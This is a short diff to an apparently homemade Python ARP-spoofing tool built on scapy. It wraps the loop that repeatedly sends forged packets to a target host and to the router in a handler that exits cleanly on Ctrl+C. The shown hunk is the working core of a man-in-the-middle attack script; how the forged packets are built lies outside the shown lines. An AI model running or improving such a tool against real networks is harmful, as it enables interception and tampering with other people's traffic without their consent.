@@ -80,12 +80,15 @@ def main():
 
     print("[+] Spoofing has begin")
     packet_count = 0
-    while True:
-        scapy.send(packet_for_target, verbose=False)
-        scapy.send(packet_for_router, verbose=False)
-        packet_count = packet_count + 2
-        print("\r[+] sent " + str(packet_count) + " packets", end="")
-        time.sleep(3)
+    try:
+        while True:
+            scapy.send(packet_for_target, verbose=False)
+            scapy.send(packet_for_router, verbose=False)
+            packet_count = packet_count + 2
+            print("\r[+] sent " + str(packet_count) + " packets", end="")
+            time.sleep(3)
+    except KeyboardInterrupt:
+        print("[+] Ctrl + C detected ... Quitting")
 
 
 #    atexit.register(stop_flow(interface))
